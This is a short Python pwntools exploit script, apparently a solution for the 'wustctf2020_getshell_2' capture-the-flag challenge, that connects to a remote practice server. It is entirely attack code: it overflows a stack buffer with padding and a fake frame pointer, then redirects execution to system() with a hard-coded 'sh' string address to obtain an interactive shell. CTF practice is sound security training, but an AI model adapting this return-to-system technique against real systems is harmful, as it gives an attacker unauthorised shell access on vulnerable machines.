# coding:utf-8

from pwn import *
from LibcSearcher import *

context(os='linux', arch='i386', log_level='debug')

proc_name = 'wustctf2020_getshell_2'
# p = process(proc_name)
p = remote('node3.buuoj.cn', 27668)
elf = ELF(proc_name)
# gdb.attach(p)
padding = 'a' * 0x18
fake_ebp = 'jkjk'
system_addr = 0x08048529
sh_addr = 0x08048670

payload = padding + fake_ebp + p32(system_addr) + p32(sh_addr)

p.recv()
p.sendline(payload)
p.interactive()

